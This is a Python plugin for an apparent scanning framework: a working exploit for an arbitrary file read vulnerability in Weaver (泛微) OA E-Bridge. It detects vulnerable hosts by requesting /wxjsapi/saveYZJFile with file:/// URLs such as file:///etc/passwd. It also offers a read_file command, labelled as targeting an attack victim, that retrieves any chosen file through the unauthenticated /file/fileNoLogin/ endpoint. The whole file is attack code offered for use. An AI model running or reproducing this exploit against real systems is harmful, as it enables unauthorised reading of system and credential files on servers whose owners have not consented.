# -*-* coding:UTF-8
import urllib.parse


class Plugin(Base):
    __info__ = {
        "name": "泛微OA E-Bridge 任意文件读取漏洞",
        "description": "泛微云桥e-Bridge存在任意文件读取漏洞，攻击者成功利用该漏洞，可实现任意文件读取，获取敏感信息。",
        "references": ["-"],
    }

    def __condition__(self):
        return self.condition(
            matches=[
                {
                    "search": "body",
                    "keyword": "wx.weaver"
                },
                {
                    "search": "body",
                    "keyword": "e-Bridge"
                }
            ]
        )

    def url(self) -> dict:
        for n, path in enumerate([
            './wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/&fileExt=txt',
            './wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt',
            './wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///&fileExt=txt'
        ]):
            r = self.request(
                method='get',
                path=path,
                headers={
                    "Content-Type": "application/x-www-form-urlencoded"
                }
            )
            if "filepath" in r.text and "extension" in r.text and "isencrypt" in r.text:
                if n == 0:
                    operate = 'Windows'
                elif n == 1:
                    operate = 'Linux'
                else:
                    operate = 'Unknown'
                self.__info__.update({"operate": operate})
                return {"LoopholeInfo": self.__info__}

    @cli.command(description='读取系统文件')
    @cli.options("url", help="攻击的目标", default="{self.target.value}")
    @cli.options("file", help="读取的文件", default="C:/")
    def read_file(self, url, file):
        r = self.request(
            method='get',
            path=urllib.parse.urljoin(
                url,
                f'/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///{file}&fileExt=txt'
            ),
            headers={
                "Content-Type": "application/x-www-form-urlencoded"
            },
            timeout=15
        )
        file_id = r.json()['id']
        r = self.request(
            method='get',
            path=urllib.parse.urljoin(url, f'/file/fileNoLogin/{file_id}'),
            headers={
                "Content-Type": "application/x-www-form-urlencoded"
            }
        )
        return r.text
